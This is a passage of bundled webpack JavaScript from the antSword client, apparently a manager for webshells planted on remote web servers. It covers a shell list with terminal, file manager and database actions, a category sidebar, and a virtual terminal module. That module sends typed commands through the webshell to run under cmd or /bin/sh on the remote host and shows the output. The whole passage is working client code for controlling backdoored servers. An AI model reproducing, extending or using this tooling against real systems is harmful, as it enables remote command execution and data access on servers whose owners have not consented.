	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var LANG_T = antSword['language']['toastr'];
	var LANG = antSword['language']['shellmanager'];

	var List = function () {
	  function List(cell, manager) {
	    _classCallCheck(this, List);

	    // cell.hideHeader();
	    // cell.setText(`<i class="fa fa-list-ul"></i> ${LANG['list']['title']}`);
	    // 删除折叠按钮
	    document.getElementsByClassName('dhxlayout_arrow dhxlayout_arrow_va')[0].remove();

	    // 初始化工具栏
	    // const toolbar = cell.attachToolbar();
	    // toolbar.loadStruct([
	    //   { id: 'add', type: 'button', text: `<i class="fa fa-plus-circle"></i> ${LANG.list.toolbar['add']}` },
	    //   { type: 'separator' },
	    //   { id: 'edit', type: 'button', text: `<i class="fa fa-edit"></i> ${LANG.list.toolbar['edit']}` }
	    // ]);

	    // 初始化数据表格
	    var grid = cell.attachGrid();

	    grid.setHeader('\n      ' + LANG['list']['grid']['url'] + ',\n      ' + LANG['list']['grid']['ip'] + ',\n      ' + LANG['list']['grid']['addr'] + ',\n      ' + LANG['list']['grid']['ctime'] + ',\n      ' + LANG['list']['grid']['utime'] + '\n    ');
	    grid.setColTypes("ro,ro,ro,ro,ro");
	    grid.setColSorting('str,str,str,str,str');
	    grid.setInitWidths("200,120,*,140,140");
	    grid.setColAlign("left,left,left,center,center");
	    grid.enableMultiselect(true);

	    // 右键
	    grid.attachEvent('onRightClick', function (id, lid, event) {
	      // 获取选中ID列表
	      var ids = (grid.getSelectedId() || '').split(',');

	      // 如果没有选中？则选中右键对应选项
	      if (ids.length === 1) {
	        grid.selectRowById(id);
	        ids = [id];
	      }

	      // 获取选中的单条数据
	      var info = {};
	      if (id && ids.length === 1) {
	        info = antSword['ipcRenderer'].sendSync('shell-findOne', id);
	        // info = {
	        //   id: id,
	        //   ip: grid.getRowAttribute(id, 'data')[1],
	        //   url: grid.getRowAttribute(id, 'data')[0],
	        //   pwd: grid.getRowAttribute(id, 'pwd'),
	        //   type: grid.getRowAttribute(id, 'type'),
	        //   encode: grid.getRowAttribute(id, 'encode') || 'utf-8',
	        //   encoder: grid.getRowAttribute(id, 'encoder') || 'default'
	        // }
	      };

	      bmenu([{ text: LANG['contextmenu']['terminal'], icon: 'fa fa-terminal', disabled: !id || ids.length !== 1, action: function action() {
	          new _terminal2.default(info);
	        } }, { text: LANG['contextmenu']['filemanager'], icon: 'fa fa-folder-o', disabled: !id || ids.length !== 1, action: function action() {
	          new _filemanager2.default(info);
	        } }, { text: LANG['contextmenu']['database'], icon: 'fa fa-database', disabled: !id || ids.length !== 1, action: function action() {
	          new _database2.default(info);
	        } }, { divider: true }, { text: LANG['contextmenu']['plugin'], icon: 'fa fa-puzzle-piece', disabled: !id || ids.length !== 1 || true, subMenu: [] }, { text: LANG['contextmenu']['pluginCenter'], icon: 'fa fa-cart-arrow-down', action: antSword['menubar'].run.bind(antSword['menubar'], 'plugin') }, { divider: true }, { text: LANG['contextmenu']['add'], icon: 'fa fa-plus-circle', action: manager.addData.bind(manager) }, { text: LANG['contextmenu']['edit'], icon: 'fa fa-edit', disabled: !id || ids.length !== 1, action: function action() {
	          manager.editData(id);
	        } }, { text: LANG['contextmenu']['delete'], icon: 'fa fa-remove', disabled: !id, action: function action() {
	          manager.delData(ids);
	        } }, { divider: true }, { text: LANG['contextmenu']['move'], icon: 'fa fa-share-square', disabled: !id, subMenu: function () {
	          var items = manager.category.sidebar.getAllItems();
	          var category = manager.category.sidebar.getActiveItem();
	          var ret = [];
	          items.map(function (_) {
	            ret.push({
	              text: _ === 'default' ? LANG['category']['default'] : _,
	              icon: 'fa fa-folder-o',
	              disabled: category === _,
	              action: function (c) {
	                return function () {
	                  var ret = antSword['ipcRenderer'].sendSync('shell-move', {
	                    ids: ids,
	                    category: c
	                  });
	                  if (typeof ret === 'number') {
	                    toastr.success(LANG['list']['move']['success'](ret), LANG_T['success']);
	                    manager.loadData();
	                    manager.category.sidebar.callEvent('onSelect', [c]);
	                  } else {
	                    toastr.error(LANG['list']['move']['error'](ret), LANG_T['error']);
	                  }
	                };
	              }(_)
	            });
	          });
	          return ret;
	        }() }, { text: LANG['contextmenu']['search'], icon: 'fa fa-search', action: manager.searchData.bind(manager), disabled: true }, { divider: true }, { text: LANG['contextmenu']['clearCache'], icon: 'fa fa-trash-o', disabled: !id, action: function action() {
	          manager.clearCache(id);
	        } }, { text: LANG['contextmenu']['clearAllCache'], icon: 'fa fa-trash', action: manager.clearAllCache.bind(manager) }], event);

	      return true;
	    });

	    // 双击
	    grid.attachEvent('onRowDblClicked', function (id) {
	      var info = antSword['ipcRenderer'].sendSync('shell-findOne', id);
	      new _filemanager2.default(info);
	    });

	    // 隐藏右键菜单
	    grid.attachEvent('onRowSelect', bmenu.hide);
	    $('.objbox').on('click', bmenu.hide);
	    $('.objbox').on('contextmenu', function (e) {
	      e.target.nodeName === 'DIV' && grid.callEvent instanceof Function ? grid.callEvent('onRightClick', [grid.getSelectedRowId(), '', e]) : 0;
	    });

	    grid.init();

	    // 变量赋值
	    this.grid = grid;
	    this.cell = cell;
	    this.toolbar = toolbar;
	  }

	  // 更新标题


	  _createClass(List, [{
	    key: 'updateTitle',
	    value: function updateTitle(num) {
	      this.cell.setText('<i class="fa fa-list-ul"></i> ' + LANG['list']['title'] + ' (' + num + ')');
	    }
	  }]);

	  return List;
	}();

	exports.default = List;

/***/ },
/* 92 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer) {'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 虚拟终端模块
	//

	// import React from 'react';
	// import ReactDOM from 'react-dom';

	var LANG_T = antSword['language']['toastr'];
	var LANG = antSword['language']['terminal'];
	// const ipcRenderer = antSword['ipcRenderer'];

	var Terminal = function () {
	  function Terminal(opts) {
	    var _this = this;

	    _classCallCheck(this, Terminal);

	    var tabbar = antSword['tabbar'];
	    var hash = String(Math.random()).substr(2, 10);

	    tabbar.addTab('tab_terminal_' + hash,
	    // `<i class="fa fa-terminal"></i> ${LANG['title']} \/\/ ${opts['ip']}`,
	    '<i class="fa fa-terminal"></i> ' + opts['ip'], null, null, true, true);
	    tabbar.attachEvent('onTabClick', function (id, lid) {
	      if (id === 'tab_terminal_' + hash) {
	        _this.term ? _this.term.focus() : 0;
	      };
	    });

	    var cell = tabbar.cells('tab_terminal_' + hash);
	    // ReactDOM.render(
	    //   <div id={`div_terminal_${hash}`} style={{
	    //     height: '100%',
	    //     margin: '0',
	    //     padding: '0px 5px 1px 5px',
	    //     overflow: 'scroll'
	    //   }} />
	    //   , cell.cell
	    // );
	    cell.attachHTMLString('\n      <div id="div_terminal_' + hash + '" style="height:100%;margin:0;padding:0 5px 1px 5px;overflow:scroll"></div>\n    ');

	    this.path = '';
	    this.opts = opts;
	    this.hash = hash;
	    this.term = null;
	    this.cell = cell;
	    this.isWin = true;
	    this.core = new antSword['core'][opts['type']](opts);

	    this.cache = new antSword['CacheManager'](this.opts['_id']);
	    // this.initTerminal($(`#div_terminal_${hash}`));
	    // 获取缓存::info
	    var dom = $('#div_terminal_' + hash);
	    var cache_info = this.cache.get('info');
	    if (cache_info) {
	      this.initTerminal(cache_info, dom);
	    } else {
	      this.cell.progressOn();
	      this.core.base.info(function (ret) {
	        _this.cell.progressOff();
	        // 判断获取数据是否正确
	        // let info = ret.split('\t');
	        // if (info.length !== 4) {
	        //   toastr.error('Loading infomations failed!', LANG_T['error']);
	        //   return this.cell.close();
	        // };
	        // 更新缓存
	        _this.cache.set('info', ret);
	        // ipcRenderer.sendSync('cache-add', {
	        //   id: this.opts['id'],
	        //   tag: 'info',
	        //   cache: ret
	        // });
	        // 初始化终端
	        _this.initTerminal(ret, dom);
	      }, function (err) {
	        toastr.error((typeof err === 'undefined' ? 'undefined' : _typeof(err)) === 'object' ? JSON.stringify(err) : String(err), LANG_T['error']);
	        _this.cell.progressOff();
	        _this.cell.close();
	      });
	    }
	  }

	  // 初始化终端


	  _createClass(Terminal, [{
	    key: 'initTerminal',
	    value: function initTerminal(ret, dom) {
	      var _this2 = this;

	      // this.cell.progressOn();
	      // // 获取缓存info
	      // const _info = ipcRenderer.sendSync('cache-get', {
	      //   id: this.opts['id'],
	      //   tag: 'info'
	      // });
	      // this.core.base.info((ret) => {
	      //   this.cell.progressOff();
	      var info = ret.split('\t');
	      var info_user = void 0;
	      var info_path = void 0;
	      var info_drive = void 0;
	      var info_system = void 0;
	      // 解析banner
	      var banner = '[[b;cyan;](*) ' + LANG['banner']['title'] + ']';
	      // 判断获取数据是否正确
	      if (info.length === 4) {
	        info_user = info[3];
	        info_path = info[0];
	        info_drive = info[1];
	        info_system = info[2];
	      } else if (info.length === 2) {
	        info_path = info[0];
	        info_drive = info[1];
	      } else {
	        toastr.error('Loading infomations failed!<br/>' + ret, LANG_T['error']);
	        this.cache.del('info');
	        return this.cell.close();
	      };
	      info_path = info_path.replace(/\\/g, '/').replace(/\.$/, '');
	      // 判断是否为linux
	      if (info_path.substr(0, 1) === '/') {
	        this.isWin = false;
	      };
	      this.path = info_path;
	      banner += '\n[[b;#99A50D;]' + LANG['banner']['path'] + ']: [[;#C3C3C3;]' + info_path + ']';
	      banner += '\n[[b;#99A50D;]' + LANG['banner']['drive'] + ']: [[;#C3C3C3;]' + info_drive + ']';
	      if (info.length === 4) {
	        banner += '\n[[b;#99A50D;]' + LANG['banner']['system'] + ']: [[;#C3C3C3;]' + info_system + ']';
	        banner += '\n[[b;#99A50D;]' + LANG['banner']['user'] + ']: [[;#C3C3C3;]' + info_user + ']';
	      }
	      // 初始化终端
	      this.term = dom.terminal(function (cmd, term) {
	        if (!cmd) {
	          return false;
	        };
	        // 如果为exit||quit则关闭窗口
	        if (cmd === 'exit' || cmd === 'quit') {
	          return _this2.cell.close();
	        };
	        term.pause();
	        // 是否有缓存
	        var cache_tag = 'command-' + new Buffer(_this2.path + cmd).toString('base64');
	        var cache_cmd = void 0;
	        if (cache_cmd = _this2.cache.get(cache_tag)) {
	          term.echo(cache_cmd);
	          return term.resume();
	        };
	        _this2.core.command.exec({
	          cmd: _this2.parseCmd(cmd, _this2.path),
	          bin: _this2.isWin ? 'cmd' : '/bin/sh'
	        }, function (_) {
	          // 解析出命令执行路径
	          var index_s = _.indexOf('[S]');
	          var index_e = _.lastIndexOf('[E]');
	          var _path = _.substr(index_s + 3, index_e - index_s - 3);

	          // let _sindex = _.indexOf('[S]') + 3;
	          // let _eindex = _.indexOf('[E]');
	          // let _path = _.substr(_sindex, _eindex - _sindex);
	          var output = _.replace('[S]' + _path + '[E]', '');
	          _path = _path.replace(/\n/g, '').replace(/\r/g, '');

	          _this2.path = _path || _this2.path;
	          term.set_prompt(_this2.parsePrompt(info_user));

	          // let output = _.substr(0, _sindex - 3).replace(/\n$/, '');
	          // 去除换行符
	          [/\n\n$/, /^\n\n/, /\r\r$/, /^\r\r/, /\r\n$/, /^\r\n/, /\n\r$/, /^\n\r/, /\r$/, /^\r/, /\n$/, /^\n/].map(function (_) {
	            output = output.replace(_, '');
	          });
	          // output = output.replace(/\n$/, '').replace(/^\n/, '').replace(/^\r/, '').replace(/\r$/, '').;
	          if (output.length > 0) {
	            term.echo(output);
	            // 保存最大100kb数据
	            if (output.length < 1024 * 1024) {
	              _this2.cache.set(cache_tag, output);
	            };
	          };
	          term.resume();
	        }, function (_) {
	          term.error( true ? JSON.stringify(_) : String(_));
	          term.resume();
	        });
	      }, {
	        greetings: banner,
	        name: 'terminal_' + this.hash,
	        prompt: this.parsePrompt(info_user),
	        exit: false
	      });
	      // }, (err) => {
	      //   toastr.error(err, LANG_T['error']);
	      //   this.cell.progressOff();
	      //   this.cell.close();
	      // });
	    }

	    // 生成CMD代码

	  }, {
	    key: 'parseCmd',
	    value: function parseCmd(cmd, path) {
	      path = path.replace(/\\\\/g, '\\').replace(/"/g, '\\"').replace(/\\/g, '\\\\');
	      return this.isWin ? 'cd /d "' + path + '"&' + cmd + '&echo [S]&cd&echo [E]' : 'cd "' + path + '";' + cmd + ';echo [S];pwd;echo [E]';
	    }

	    // 生成路径提示

	  }, {
	    key: 'parsePrompt',
	    value: function parsePrompt(user) {
	      return this.isWin ? '[[b;white;]' + this.path.replace(/\//g, '\\') + '> ]' : (user ? '([[b;#E80000;]' + user + ']:[[;#0F93D2;]' : '[[;0F93D2;]') + this.path + ']) $ ';
	    }
	  }]);

	  return Terminal;
	}();

	exports.default = Terminal;
	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer))

/***/ },
/* 93 */
/***/ function(module, exports) {

	//
	// 右侧目录管理模块
	//

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var LANG_T = antSword['language']['toastr'];
	var LANG = antSword['language']['shellmanager'];

	var Category = function () {
	  function Category(cell, manager) {
	    var _this = this;

	    _classCallCheck(this, Category);

	    // cell.setText(`<i class="fa fa-folder"></i> ${LANG['category']['title']}`);
	    cell.setWidth(222);
	    cell.fixSize(1, 0);

	    // 初始化toolbar
	    var toolbar = cell.attachToolbar();
	    toolbar.loadStruct([{ id: 'add', type: 'button', text: '<i class="fa fa-plus-circle"></i> ' + LANG['category']['toolbar']['add'] }, { type: 'separator' }, { id: 'del', type: 'button', text: '<i class="fa fa-trash"></i> ' + LANG['category']['toolbar']['del'], disabled: true }]);
	    // toolbar点击
	    toolbar.attachEvent('onClick', function (id) {
	      switch (id) {
	        case 'add':
	          // 添加分类
	          layer.prompt({
	            title: '<i class="fa fa-plus-circle"></i> ' + LANG['category']['add']['title'],
	            value: new Date().format('yyyyMMdd')
	          }, function (value, index, ele) {
	            layer.close(index);
	            sidebar.callEvent('onSelect', [value]);
	          });
	          break;
	        case 'del':
	          // 删除分类
	          var category = sidebar.getActiveItem();
	          layer.confirm(LANG['category']['del']['confirm'], {
	            icon: 2, shift: 6,
	            // skin: 'layui-layer-molv',
	            title: '<i class="fa fa-trash"></i> ' + LANG['category']['del']['title']
	          }, function (_) {
	            layer.close(_);
	            // 1. 删除分类数据
	            var ret = antSword['ipcRenderer'].sendSync('shell-clear', category);
	            if (typeof ret === 'number') {
	              toastr.success(LANG['category']['del']['success'](category), LANG_T['success']);
	              // 2. 跳转到默认分类
	              sidebar.callEvent('onSelect', ['default']);
	              // 3. 删除侧边栏
	              sidebar.items(category).remove();
	              setTimeout(_this.updateTitle.bind(_this), 100);
	            } else {
	              return toastr.error(LANG['category']['del']['error'](category, ret.toString()), LANG_T['error']);
	            }
	          });
	          break;
	      }
	    });

	    // 初始化sidebar
	    var sidebar = cell.attachSidebar({
	      template: 'text',
	      width: 222
	    });
	    // 默认分类
	    sidebar.addItem({
	      id: 'default',
	      bubble: 0,
	      selected: true,
	      text: '<i class="fa fa-folder-o"></i> ' + LANG['category']['default'] + '</i>'
	    });
	    // sidebar点击事件
	    sidebar.attachEvent('onSelect', function (id) {
	      // 更改删除按钮状态
	      toolbar[id === 'default' ? 'disableItem' : 'enableItem']('del');
	      manager.loadData({
	        category: id
	      });
	    });

	    this.cell = cell;
	    this.toolbar = toolbar;
	    this.sidebar = sidebar;
	  }

	  // 更新标题


	  _createClass(Category, [{
	    key: 'updateTitle',
	    value: function updateTitle() {
	      var num = this.sidebar.getAllItems().length;
	      this.cell.setText('<i class="fa fa-folder"></i> ' + LANG['category']['title'] + ' (' + num + ')');
	    }
	  }]);

	  return Category;
	}();

	exports.default = Category;

/***/ }
/******/ ]);